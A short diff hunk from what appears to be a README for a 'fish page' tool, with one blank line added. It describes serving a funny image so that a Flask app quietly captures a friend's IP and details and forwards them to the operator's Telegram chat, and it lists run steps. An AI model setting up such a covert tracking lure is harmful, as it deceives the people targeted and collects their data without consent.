@@ -7,6 +7,7 @@ When friend open this url - he will see funny image and Python Flask get his IP,
   And return this info on your Telegram chat.
   
   To run this:
+  
   0. Change config.py to your parameter.
   1. Run fishPage.py - this page with image.
   2. Run telegramBot.py - properly, Bot.
